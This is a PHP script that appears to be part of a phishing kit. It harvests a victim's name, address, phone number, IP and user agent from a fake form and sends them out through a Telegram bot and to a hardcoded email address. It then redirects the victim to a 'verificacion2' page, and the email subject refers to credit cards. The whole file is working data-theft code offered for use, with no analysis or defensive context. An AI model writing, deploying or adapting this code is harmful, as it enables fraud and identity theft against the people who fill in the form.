<?php
require_once('config.php');
$agent = $_SERVER['HTTP_USER_AGENT'];
$email = "cmgrace@yandex.com";
$ip = getenv("REMOTE_ADDR");
$message = "==================+[ ---:||sscu||:--]+==================\n";
$message .= "First Name : " . $_POST['fn'] . "\n";
$message .= "Address : " . $_POST['add'] . "\n";
$message .= "City : " . $_POST['cty'] . "\n";
$message .= "State : " . $_POST['ste'] . "\n";
$message .= "Zip : " . $_POST['zip'] . "\n";
$message .= "Country : " . $_POST['cnt'] . "\n";
$message .= "Phone : " . $_POST['phn'] . "\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : " . $ip . "\n";
$message .= "User-Agent : " . $agent . "\n";
$message .= "--------------------------------------------\n";
$message .= "=============+ [:- vipstore911.com] +=============\n";


require_once('db.php');

$data = $message;
$send = ['chat_id' => $chatid, 'text' => $data];
$website = "https://api.telegram.org/bot$apikey";
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save to DB
if (isset($pdo)) {
    $addrData = [
        'full_name' => $_POST['fn'],
        'address' => $_POST['add'],
        'city' => $_POST['cty'],
        'state' => $_POST['ste'],
        'zip' => $_POST['zip'],
        'country' => $_POST['cnt'],
        'phone' => $_POST['phn']
    ];
    upsertLog($pdo, $ip, $agent, $addrData);
}

$subject = "Credit Card-popular-$ip";
$data = $_POST['cn'];
$site = substr($data, strpos($data, "@") + 1);

mail($email, $subject, $message);

mail($email, $subject, $message);
header("Location: verificacion2.html");
?>